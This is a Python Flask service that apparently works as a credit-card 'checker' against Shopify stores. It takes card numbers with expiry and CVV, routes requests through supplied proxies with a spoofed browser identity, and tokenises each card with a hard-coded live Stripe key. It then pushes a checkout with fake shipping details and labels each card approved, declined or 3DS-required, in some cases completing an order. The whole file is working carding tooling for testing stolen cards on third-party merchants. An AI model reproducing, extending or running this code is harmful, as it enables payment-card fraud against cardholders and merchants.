from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

# --- STRIPE TOKEN GENERATOR ---
def get_stripe_token(cc, mm, yy, cvv):
    url = "https://api.stripe.com/v1/tokens"
    # Live Key (Use with caution on public platforms)
    pk = "pk_live_TYtbVvotLQUwXqtVFZQfHTgN"
    
    data = f"card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&key={pk}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        r = requests.post(url, data=data, headers=headers, timeout=10)
        res = r.json()
        if 'id' in res:
            return res['id']
        else:
            return None
    except:
        return None

# --- MAIN CHECKER FUNCTION (No threading for Vercel) ---
def process_check(cc, mm, yy, cvv, site_url, proxy_str):
    proxies = None
    if proxy_str:
        try:
            parts = proxy_str.split(':')
            # Format: ip:port:user:pass
            if len(parts) == 4:
                ip, port, user, pwd = parts
                proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
                proxies = {"http": proxy_url, "https": proxy_url}
            # Format: ip:port
            elif len(parts) == 2:
                ip, port = parts
                proxy_url = f"http://{ip}:{port}"
                proxies = {"http": proxy_url, "https": proxy_url}
        except:
            pass

    session = requests.Session()
    if proxies:
        session.proxies.update(proxies)
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })

    result_data = {
        "Response": "Unknown Error",
        "Price": "-",
        "Gate": "Shopify"
    }

    try:
        # 1. Product Fetch
        r = session.get(f"{site_url}/products.json?limit=1", timeout=10)
        if r.status_code != 200:
            result_data["Response"] = "Site Error (WAF/Block)"
            return result_data

        products = r.json().get('products', [])
        if not products:
            result_data["Response"] = "No Products Found"
            return result_data
        
        variant_id = products[0]['variants'][0]['id']
        product_price = products[0]['variants'][0].get('price', '0.00')

        # 2. Add to Cart
        r = session.post(f"{site_url}/cart/add.js", json={'id': variant_id, 'quantity': 1}, timeout=10)
        if r.status_code != 200:
            result_data["Response"] = "Cart Error"
            return result_data

        # 3. Checkout Page
        r = session.get(f"{site_url}/checkout", timeout=15)
        auth_match = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
        
        if not auth_match:
            result_data["Response"] = "Token Error (Site protected)"
            return result_data
        
        auth_token = auth_match.group(1)

        # 4. Stripe Token
        stripe_token = get_stripe_token(cc, mm, yy, cvv)
        if not stripe_token:
            result_data["Response"] = "DECLINED (Invalid Card Data)"
            return result_data

        # 5. Payment Request
        payload = {
            "authenticity_token": auth_token,
            "step": "payment_method",
            "checkout[email]": "testuser123@gmail.com",
            "checkout[shipping_address][first_name]": "Test",
            "checkout[shipping_address][last_name]": "User",
            "checkout[shipping_address][address1]": "123 Street",
            "checkout[shipping_address][city]": "New York",
            "checkout[shipping_address][zip]": "10001",
            "checkout[shipping_address][country]": "US",
            "payment_info[payment_type]": "stripe",
            "payment_info[stripe_token]": stripe_token,
        }

        r = session.post(f"{site_url}/checkout", data=payload, timeout=20, allow_redirects=True)
        final_text = r.text.lower()

        if "thank_you" in r.url.lower() or "order_confirmed" in final_text:
            result_data["Response"] = "Order completed 💎"
            result_data["Price"] = product_price
        elif "insufficient_funds" in final_text:
            result_data["Response"] = "APPROVED (Insufficient Funds)"
        elif "3d_secure" in final_text or "3ds" in final_text:
            result_data["Response"] = "3DS REQUIRED"
        elif "declined" in final_text or "card_was_declined" in final_text:
            result_data["Response"] = "DECLINED"
        else:
            result_data["Response"] = "Unknown Response"

    except requests.exceptions.ProxyError:
        result_data["Response"] = "Proxy Error"
    except Exception as e:
        result_data["Response"] = f"Error: {str(e)[:30]}"
    
    return result_data

# --- FLASK ROUTE ---
@app.route('/shopi.php', methods=['GET'])
def check_card():
    cc_data = request.args.get('cc')
    site_url = request.args.get('url')
    proxy_data = request.args.get('proxy')

    if not cc_data or not site_url:
        return jsonify({"Response": "Missing Parameters", "Price": "-", "Gate": "-"})

    try:
        parts = cc_data.split('|')
        if len(parts) != 4:
            return jsonify({"Response": "Invalid Card Format", "Price": "-", "Gate": "-"})
        cc, mm, yy, cvv = parts
    except:
        return jsonify({"Response": "Card Parse Error", "Price": "-", "Gate": "-"})

    if not site_url.startswith('http'):
        site_url = f"https://{site_url}"

    # Direct call (Vercel has timeout limits, usually 10s for Hobby)
    result = process_check(cc, mm, yy, cvv, site_url, proxy_data)
    return jsonify(result)

# Vercel needs this handler
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
